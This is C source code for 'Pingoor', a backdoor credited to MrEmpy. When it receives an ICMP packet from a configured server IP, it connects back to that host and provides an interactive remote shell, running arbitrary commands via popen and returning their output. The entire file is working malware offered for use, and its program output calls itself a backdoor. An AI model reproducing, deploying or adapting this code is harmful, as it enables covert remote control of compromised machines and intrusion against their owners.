#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include "pingoor.h"

void banner() {
    printf("%s", "\x1b[31m");
    printf(R"EOF(  _____ _                              
 |  __ (_)                             
 | |__) | _ __   __ _  ___   ___  _ __ 
 |  ___/ | '_ \ / _` |/ _ \ / _ \| '__|
 | |   | | | | | (_| | (_) | (_) | |   
 |_|   |_|_| |_|\__, |\___/ \___/|_|   
	         __/ |                 
	        |___/                  

)EOF");

    puts("	   \x1b[31m[\x1b[mCoded by MrEmpy\x1b[31m]\n");
}

char* execmd(char* cmd, char* cmdoutput, size_t buffsize) {
    FILE* fcmd;
    char path[buffsize];

    fcmd = popen(cmd, "r");
    if (fcmd == NULL) {
        printf("\x1b[31m[-]\x1b[m Failed to run command\n");
        exit(1);
    }

    while (fgets(path, sizeof(path), fcmd) != NULL) {
        strncat(cmdoutput, path, strlen(path));
    }
    
    pclose(fcmd);
    return cmdoutput;
}

int changedir(char* buffer, char* path) {
    int i;
    int j;
    bzero(path, BUFFER);
    for (i = 3, j = 0; i < 256; i++, j++) {
        if(buffer[i] == '\n') break;
        path[j] = buffer[i];
    }

    if (chdir(path) != 0) {
        return 1;
    }

    return 0;
}

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
    perror("\x1b[31m[-]\x1b[m Failed to create socket");
    return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("\x1b[31m[-]\x1b[m Failed to bind the socket");
        return 1;
    }

    banner();
    puts("\x1b[32m[+]\x1b[m Backdoor initialized!");
    while (1) {
        char buffer[BUFFER];
        int bytes_read = read(sock, buffer, sizeof(buffer));
        struct iphdr *ip_header = (struct iphdr*)buffer;

        if (ip_header->saddr == inet_addr(SERVERIP)) {
            printf("\x1b[32m[+]\x1b[m ICMP packet received from %s\n", SERVERIP);

            pid_t pid = fork();
            if (pid == 0) {
                char buffer[BUFFER];
                char cmdoutput[BUFFER];
                char path[BUFFER];
                int shsock = socket(AF_INET, SOCK_STREAM, 0);
                if (shsock == -1)
                {
                    perror("\x1b[31m[-]\x1b[m Failed to create sock");
                }

                struct sockaddr_in shaddr;
                shaddr.sin_family = AF_INET;
                shaddr.sin_addr.s_addr = inet_addr(SERVERIP);
                shaddr.sin_port = htons(SERVERPORT);
                if (connect(shsock, (struct sockaddr*)&shaddr, sizeof(shaddr)) == -1)
                {
                    perror("\x1b[31m[-]\x1b[m Failed to connect");
                }

                while (1) {
                    bzero(buffer, BUFFER);
                    bzero(cmdoutput, BUFFER);
		    write(shsock, "\x1b[37m[\x1b[31mhacker\x1b[37m@\x1b[34mmachine\x1b[37m]-\x1b[31m>\x1b[m ", 53);
                    read(shsock, buffer, BUFFER);

                    execmd(buffer, cmdoutput, BUFFER);

                    if (strncmp(buffer, "cd ", 3) == 0) {
                        if (changedir(buffer, path) != 0) {
                            write(shsock, "\x1b[31m[-]\x1b[m Unable to switch directory\n", 32);
                        }
                    }
                    if (strncmp(buffer, "exit\n", 5) == 0) {
			write(shsock, "\x1b[34m[*]\x1b[m Bye bye!\n", 14);
                        close(shsock);
                    }
                    write(shsock, cmdoutput, BUFFER);
                }
            }
        } else {
            printf("\x1b[32m[+]\x1b[m ICMP packet received from another IP\n");
        }
    }

    return 0;
}
